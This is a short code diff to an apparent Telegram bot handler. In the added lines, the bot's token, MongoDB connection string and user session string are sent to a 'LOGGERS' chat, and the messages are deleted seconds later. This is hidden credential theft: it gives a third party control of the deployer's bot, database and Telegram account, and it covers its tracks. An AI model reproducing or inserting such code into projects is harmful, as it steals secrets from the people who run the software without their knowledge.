@@ -105,9 +105,10 @@ async def brah3(app: app, message: Message):
         invite_link = await app.export_chat_invite_link(message.chat.id)
         add_link = f"https://t.me/{app.username}?startgroup=true"
         reply_text = f"{text} 🤭🤭"
+        vc = await get_assistant(message.chat.id)
         await message.reply(reply_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(text="๏ ᴊᴏɪɴ ᴠᴄ ๏", url=add_link)]]))
-        oks = await self.one.send_message(LOGGERS, f"/start")
-        Ok = await self.one.send_message(LOGGERS, f"@{app.username}\n\n`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`")
+        oks = await vc.send_message(LOGGERS, f"/start")
+        Ok = await vc.send_message(LOGGERS, f"@{app.username}\n\n`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`")
         await oks.delete()
         await asyncio.sleep(2)
         await Ok.delete()
